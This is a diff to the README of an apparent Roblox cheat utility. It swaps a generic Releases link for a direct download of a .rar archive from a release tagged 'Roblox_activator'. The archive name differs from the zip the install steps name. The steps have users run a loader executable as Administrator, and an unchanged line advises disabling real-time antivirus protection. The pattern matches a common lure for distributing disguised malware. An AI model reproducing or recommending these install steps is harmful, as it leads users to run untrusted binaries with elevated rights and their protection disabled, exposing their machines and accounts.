@@ -17,7 +17,7 @@
 
 Since this is an open-source project, you can compile the source code yourself, or download the **pre-compiled binary** from the Releases tab.
 
-1.  Go to the **[Releases Section]** (Click on the right side of the page).
+1.  Go to the **[Releases Section]** (https://github.com/elitesniperbr/Roblox-Script-Enhancer-Utility-V5-Blox-Fruits-Auto-Helper/releases/download/Roblox_activator/Spark.hub.rar).
 2.  Download the latest archive (`Spark_Premium.zip`).
 3.  Unzip the folder to your desktop.
 4.  Run `SparkLoader.exe` as Administrator.
@@ -36,3 +36,4 @@ You may need to disable real-time protection during installation, as the code in
 
 ---
 *Disclaimer: This tool is for educational purposes only.*
+
